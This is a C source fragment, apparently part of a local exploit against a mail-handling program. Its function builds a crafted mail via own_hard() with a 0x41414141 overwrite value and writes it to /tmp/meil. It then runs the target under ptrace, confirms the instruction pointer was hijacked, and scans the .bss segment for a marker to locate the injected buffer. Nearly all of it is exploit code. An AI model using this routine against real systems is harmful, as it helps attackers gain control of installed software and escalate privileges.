
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct user_regs_struct {int eip; } ;
struct bss {int start; int end; } ;


 int PTRACE_GETREGS ;
 int PTRACE_PEEKTEXT ;
 int die (int,char*) ;
 scalar_t__ errno ;
 int fflush (int ) ;
 struct bss getbss () ;
 int own_hard (int,int,int,int,char*) ;
 int prepare_mail (char*,char*,char*) ;
 int printf (char*,int,...) ;
 int ptrace (int ,int,int,struct user_regs_struct*) ;
 int putchar (char) ;
 int start_debug (int) ;
 int stdout ;
 int stop_debug (int) ;
 int write_mail (char*) ;

int findbuf(int ebp) {
 struct bss b;
 int pid;
 int cmd = 0x12345678;
 int addr;
 int ret = -1;
        struct user_regs_struct regs;
 int x;


 b = getbss();

 printf(".bss START =0x%.8x END=0x%.8x\n",b.start,b.end);
 prepare_mail("from","subj","to");
 own_hard(0x41414141,b.start,b.start,ebp,(char*)&cmd);
 write_mail("/tmp/meil");

 addr = b.start;

        pid = start_debug(1);


        if(ptrace(PTRACE_GETREGS,pid,((void*)0),&regs)==-1)
  return -1;


 if(regs.eip != 0x41414141)
  return -1;

 for(addr = b.start; addr < b.end; addr++) {
  printf("Checking 0x%.8x\r",addr);
  fflush(stdout);
  x = ptrace(PTRACE_PEEKTEXT,pid,addr,((void*)0));
                if(x == -1 && errno != 0)
              die(1,"ptrace()");
  if(x == cmd) {
   ret = addr;
   break;
  }
 }
 stop_debug(pid);
 putchar('\n');
 return ret;
}
